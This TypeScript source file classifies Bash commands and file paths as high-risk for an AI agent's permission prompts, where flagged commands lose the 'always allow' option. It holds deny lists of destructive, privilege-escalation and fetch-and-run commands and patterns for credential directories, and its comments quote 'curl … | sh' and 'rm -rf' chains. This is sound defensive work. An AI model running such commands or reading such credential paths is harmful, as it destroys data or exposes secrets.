// High-risk rule classifier — drives the "hide ‘以后都允许’ button" UX in both
// the Feishu card and the terminal prompt. Channel users have no shoulder
// surfing safety net; granting a permanent rule for `rm -rf` from a phone
// notification is a foot-gun that's hard to recover from. The classifier is
// intentionally conservative: false positives (hiding the button for a benign
// command) only cost one extra "allow once" click, but a false negative
// (offering a permanent rule for an arbitrary-code-execution vector) is
// unrecoverable. When in doubt, classify high-risk.
//
// Spec note (Iter 2): a chained Bash command is high-risk if ANY of its
// subcommands is high-risk. `cd /tmp && rm -rf foo` triggers via the `rm`
// segment even though the head `cd` is benign. The suggester already splits
// the chain into per-segment `Bash(<head>:*)` rules (suggestions.ts:
// suggestBashRules), so the simplest gate is to scan that array. As a
// belt-and-suspenders safeguard for the rare fallback case where the
// suggester returns nothing precise, we re-scan the raw tool input.
//
// §1.4 (2026-05-14): a head-only scan against a small fixed set missed a
// large family of arbitrary-code-execution / privilege-escalation vectors —
// ephemeral package runners (`npx`, `pnpm dlx` — fetch-and-run remote code,
// the `curl … | sh` family), `source <(curl …)`, command wrappers that hide
// the real head in their arguments (`xargs sh -c`, `timeout 10 bash -c`,
// `find -exec`), path / quote evasion (`/bin/rm`, `\rm`, `'rm'`) and command
// substitution used as the command itself (`$(curl …)`). The classifier now
// normalizes heads, unwraps wrapper commands, and treats package runners as
// high-risk. See `isHighRiskBashSegment` below.
//
// Deliberately NOT high-risk: language interpreters (`python`, `node`,
// `perl`, `ruby`, …). They are general-purpose, not inherently destructive,
// and an everyday command for this workload — a hidden "always allow" button
// on every `python …` invocation is pure friction. The "soundness hole"
// argument (a broad `Bash(python:*)` rule also covers `python -c <evil>`)
// does not actually buy security: anyone who can run `python` can run `sh`,
// and `sh` is already high-risk — flagging the interpreter only relocates
// the friction, it does not close the path. Shells (`bash`/`sh`/…) stay
// high-risk because `curl … | sh` is the specific install-from-internet
// attack the original list was built around.

import { splitBashCommand, tokenizeBashSegment } from './bash-parse.js'
import { parseRule } from './rules.js'
import type { PermissionAskInput, PermissionRuleValue } from './types.js'

// Bash heads whose effects are too destructive / privilege-shifting to grant
// via "以后都允许", regardless of how they are invoked.
//
//   rm / dd / mkfs / mkfs.*             — destroys data
//   sudo / su / doas / pkexec / runuser — privilege escalation
//   bash / sh / zsh / fish / dash / ksh — runs an arbitrary script (`curl … | sh`)
//   eval                               — arbitrary code execution
//   source / .                         — executes a script in the *current* shell
//
// chmod / chown / kill etc. are deliberately NOT here — they're too common in
// benign workflows (`chmod +x deploy.sh`) and a permanent rule for them is a
// normal user expectation.
const HIGH_RISK_BASH_HEADS = new Set<string>([
  'rm',
  'dd',
  'mkfs',
  'sudo',
  'su',
  'doas',
  'pkexec',
  'runuser',
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'eval',
  'source',
  '.',
])

// Ephemeral package runners — download and execute arbitrary remote packages.
// From a static command string they are indistinguishable from running a
// locally-installed binary (`npx tsc`), so they are treated as high-risk: a
// permanent `Bash(npx:*)` rule is "allow the agent to fetch-and-run anything".
// Single-token forms have no benign subcommand (`npx` / `bunx` / `uvx` only
// run things).
const PKG_RUNNER_HEADS_1 = new Set<string>(['npx', 'bunx', 'uvx'])
// Two-token forms — must be checked before the plain head so `npm exec` /
// `pnpm dlx` are not mistaken for benign `npm` / `pnpm` subcommands.
const PKG_RUNNER_HEADS_2 = new Set<string>([
  'npm exec',
  'pnpm dlx',
  'yarn dlx',
  'bun x',
  'uv run',
  'pipx run',
])

// Command wrappers — they run another command passed in their *arguments*, so
// a head-only scan sees only the wrapper. The classifier scans their argument
// tokens for a high-risk head; a persisted `Bash(<wrapper>:*)` rule is itself
// high-risk because it lets the wrapped command be anything.
const WRAPPER_HEADS = new Set<string>([
  'env',
  'xargs',
  'find',
  'timeout',
  'nohup',
  'setsid',
  'exec',
  'command',
  'builtin',
  'nice',
  'ionice',
  'stdbuf',
  'time',
  'watch',
])

// Path prefixes whose subtrees should never get a persisted Edit/Write rule.
// Keep the list short — `/etc`, `/usr`, `/boot`, `/sys`, `/proc` cover the
// "system files" intuition without bleeding into user workspaces. `/var`
// is intentionally absent (too broad; `/var/log` writes are common).
const HIGH_RISK_PATH_PREFIXES = ['/etc', '/usr', '/boot', '/sys', '/proc']

// Sensitive user-home subdirs. Match anywhere in the path so both
// `/home/alice/.ssh/...` and `/Users/alice/.ssh/...` are caught.
const HIGH_RISK_PATH_SUFFIX_PATTERNS: ReadonlyArray<RegExp> = [
  /(?:^|\/)\.ssh(?:\/|$)/,
  /(?:^|\/)\.gnupg(?:\/|$)/,
  /(?:^|\/)\.aws(?:\/|$)/,
  /(?:^|\/)\.kube(?:\/|$)/,
]

/**
 * True when this single suggested rule should suppress the "以后都允许" UX.
 * Operates on the rule value alone — the caller wraps with a fold over the
 * suggestion list.
 */
export function isHighRiskRule(value: PermissionRuleValue): boolean {
  if (value.toolName === 'Bash') {
    return isHighRiskBashContent(value.ruleContent)
  }
  if (
    value.toolName === 'Edit' ||
    value.toolName === 'Write' ||
    value.toolName === 'Read'
  ) {
    return isHighRiskPathContent(value.ruleContent)
  }
  return false
}

export function isHighRiskRulePattern(pattern: string): boolean {
  try {
    return isHighRiskRule(parseRule(pattern))
  } catch {
    return false
  }
}

/**
 * True when ANY rule in the group is high-risk. This is the spec point: a
 * chained command like `rm -rf foo && curl example.com | sh` produces
 * multiple Bash rules and any one of them being high-risk poisons the whole
 * grant — the user shouldn't get a button that quietly grants `Bash(rm:*)`
 * because it's bundled with another non-high-risk rule.
 */
export function containsHighRiskRule(rules: PermissionRuleValue[]): boolean {
  return rules.some(isHighRiskRule)
}

/**
 * Top-level decision driver: scan the suggested rule set first, then fall
 * back to the raw tool input when the suggester returned only a tool-wide
 * fallback. Used by approver UIs to gate the persistence option.
 */
export function isHighRiskAsk(ask: PermissionAskInput): boolean {
  // FeishuDelete is the only Feishu write that stays high-risk: even with
  // Feishu's trash bin, a model-initiated bulk delete is a UX disaster. All
  // other Feishu writes (create-doc / create-folder / append-doc / sheet
  // append+overwrite / move) are scoped to the user's own workspace and
  // either purely incremental or recoverable from version history, so they
  // can be granted "以后都允许" like any other write tool.
  if (ask.toolName === 'FeishuDeleteConfirm') {
    return true
  }
  if (containsHighRiskRule(ask.suggestedRules)) {
    return true
  }
  if (ask.toolName === 'Bash') {
    const cmd = (ask.input as { command?: unknown })?.command
    if (typeof cmd === 'string') {
      return commandContainsHighRiskBash(cmd)
    }
  }
  if (
    ask.toolName === 'Edit' ||
    ask.toolName === 'Write' ||
    ask.toolName === 'Read'
  ) {
    const file = (ask.input as { file_path?: unknown })?.file_path
    if (typeof file === 'string') {
      return isHighRiskPathLiteral(file)
    }
  }
  return false
}

/**
 * Direct scan of a raw bash command string. Same chain-aware split the
 * suggester uses, so `cd /tmp && rm foo` reports true via the `rm` segment.
 * Exported so unit tests and admin tooling can probe the classifier.
 */
export function commandContainsHighRiskBash(command: string): boolean {
  for (const segment of splitBashCommand(command)) {
    if (isHighRiskBashSegment(segment)) return true
  }
  return false
}

// ── Bash segment classification ────────────────────────────────────────────

/**
 * Normalize a command-name token so path / quote / backslash evasion can't
 * slip a high-risk head past the set membership check:
 *   `/bin/rm` → `rm`   `\rm` → `rm`   `'rm'` → `rm`   `"/usr/bin/sudo"` → `sudo`
 */
function normalizeBashHead(token: string): string {
  let t = token.trim()
  // strip a single leading backslash escape (alias bypass: `\rm`)
  if (t.startsWith('\\')) t = t.slice(1)
  // strip matching surrounding quotes (`'rm'`, `"rm"`), possibly layered
  while (
    t.length >= 2 &&
    ((t[0] === "'" && t.endsWith("'")) || (t[0] === '"' && t.endsWith('"')))
  ) {
    t = t.slice(1, -1)
  }
  // basename — drop an absolute / relative path prefix (`/bin/rm`, `./rm`)
  const slash = t.lastIndexOf('/')
  if (slash >= 0) t = t.slice(slash + 1)
  return t
}

/**
 * True when a single (normalized) token names a head that is high-risk on its
 * own — destructive / privilege-escalating heads, single-token package
 * runners, or a command substitution used as the command itself.
 */
function isHighRiskHeadToken(token: string): boolean {
  const h = normalizeBashHead(token)
  if (!h) return false
  if (HIGH_RISK_BASH_HEADS.has(h)) return true
  if (h.startsWith('mkfs.')) return true
  if (PKG_RUNNER_HEADS_1.has(h)) return true
  // command substitution used as the command itself: `$(curl url)` / backtick
  if (h.startsWith('$(') || h.startsWith('`')) return true
  return false
}

/** True when the segment's leading token(s) form an ephemeral package runner. */
function isPkgRunnerHead(tokens: string[]): boolean {
  if (tokens.length === 0) return false
  const t0 = normalizeBashHead(tokens[0]!)
  if (PKG_RUNNER_HEADS_1.has(t0)) return true
  if (tokens.length >= 2) {
    const t1 = tokens[1]!.toLowerCase()
    if (PKG_RUNNER_HEADS_2.has(`${t0} ${t1}`)) return true
  }
  return false
}

// Argument tokens that are never the wrapped command's head: options (`-x`),
// pure numbers (`timeout 10 …`), env assignments (`env VAR=1 …`), and `.` /
// `..` (a path argument, e.g. `find . -name …` — distinct from the `.` source
// builtin, which only matters in head position).
function isTrivialArgToken(tok: string): boolean {
  if (tok === '.' || tok === '..') return true
  if (tok.startsWith('-')) return true
  if (/^\d+$/.test(tok)) return true
  if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tok)) return true
  return false
}

const SUBSTITUTION_BODY = /\$\(([^()]*)\)|`([^`]*)`/g

/**
 * True when a single chain-split segment is high-risk. Handles, in order:
 *   - ephemeral package runners (`npx`, `pnpm dlx`, …)
 *   - destructive / interpreter / priv-esc / source heads (with normalization)
 *   - command wrappers (`env`, `xargs`, `find -exec`, `timeout`, `nohup`, …)
 *     whose real command head lives in their argument tokens
 *   - command substitution bodies (`echo $(rm -rf x)`)
 */
function isHighRiskBashSegment(segment: string): boolean {
  const tokens = tokenizeBashSegment(segment)
  if (tokens.length === 0) return false

  // 2-token package runners must be checked before the plain head so
  // `npm exec` / `pnpm dlx` aren't read as benign `npm` / `pnpm`.
  if (isPkgRunnerHead(tokens)) return true

  // Destructive / priv-esc / shell / interpreter / single-token-runner head,
  // with path / quote / backslash normalization.
  if (isHighRiskHeadToken(tokens[0]!)) return true

  // Wrapper commands carry the real command in their arguments.
  const head = normalizeBashHead(tokens[0]!)
  if (WRAPPER_HEADS.has(head) && isHighRiskWrapperArgs(head, tokens)) {
    return true
  }

  // Command substitution executes even when it sits inside another command's
  // arguments (`echo $(rm -rf x)`); recurse into each `$(…)` / backtick body.
  // The splitter keeps substitution bodies opaque, so they survive intact in
  // the segment text. Each level strips one paren/backtick pair, so this
  // terminates.
  for (const m of segment.matchAll(SUBSTITUTION_BODY)) {
    const body = m[1] ?? m[2]
    if (body && body.trim() && commandContainsHighRiskBash(body)) return true
  }

  return false
}

/**
 * Scan a wrapper command's argument tokens for a high-risk wrapped command.
 * `find` is special — it only runs a command via `-exec` / `-execdir` /
 * `-ok` / `-okdir`, so scanning every token would false-positive on
 * `find . -name rm`. Other wrappers run the first non-option argument, but we
 * scan all of them: option-value parsing is a rabbit hole and an over-match
 * (`xargs grep rm` → high-risk) only costs an "allow once" click.
 */
function isHighRiskWrapperArgs(head: string, tokens: string[]): boolean {
  if (head === 'find') {
    for (let i = 1; i < tokens.length - 1; i++) {
      if (/^-(exec|execdir|ok|okdir)$/.test(tokens[i]!)) {
        const rest = tokens.slice(i + 1)
        if (isHighRiskHeadToken(rest[0]!)) return true
        if (isPkgRunnerHead(rest)) return true
      }
    }
    return false
  }
  for (let i = 1; i < tokens.length; i++) {
    const tok = tokens[i]!
    if (isTrivialArgToken(tok)) continue
    if (isHighRiskHeadToken(tok)) return true
    if (isPkgRunnerHead(tokens.slice(i))) return true
  }
  return false
}

function isHighRiskBashContent(content: string | undefined): boolean {
  if (!content) return false
  // content shape: "rm:*" / "git push:*" / "pnpm dlx:*" — head precedes ":".
  const colon = content.indexOf(':')
  const head = (colon >= 0 ? content.slice(0, colon) : content).trim()
  if (!head) return false
  // The rule head may be one or two tokens ("rm", "git push", "pnpm dlx").
  const tokens = head.split(/\s+/).filter(Boolean)
  if (tokens.length === 0) return false
  if (isPkgRunnerHead(tokens)) return true
  if (isHighRiskHeadToken(tokens[0]!)) return true
  // A persisted `Bash(<wrapper>:*)` rule is itself high-risk: unlike the raw
  // command path (where we can scan the wrapper's args), a broad wrapper rule
  // lets the wrapped command be anything.
  if (WRAPPER_HEADS.has(normalizeBashHead(tokens[0]!))) return true
  return false
}

function isHighRiskPathContent(content: string | undefined): boolean {
  if (!content) return false
  // content shape: "/etc/foo/**" — drop the trailing "/**" wildcard if
  // present so the prefix match below is consistent with literal paths.
  const dir = content.endsWith('/**') ? content.slice(0, -3) : content
  return isHighRiskPathLiteral(dir)
}

function isHighRiskPathLiteral(absolutePath: string): boolean {
  if (!absolutePath) return false
  for (const prefix of HIGH_RISK_PATH_PREFIXES) {
    if (absolutePath === prefix || absolutePath.startsWith(`${prefix}/`)) {
      return true
    }
  }
  for (const pattern of HIGH_RISK_PATH_SUFFIX_PATTERNS) {
    if (pattern.test(absolutePath)) return true
  }
  return false
}
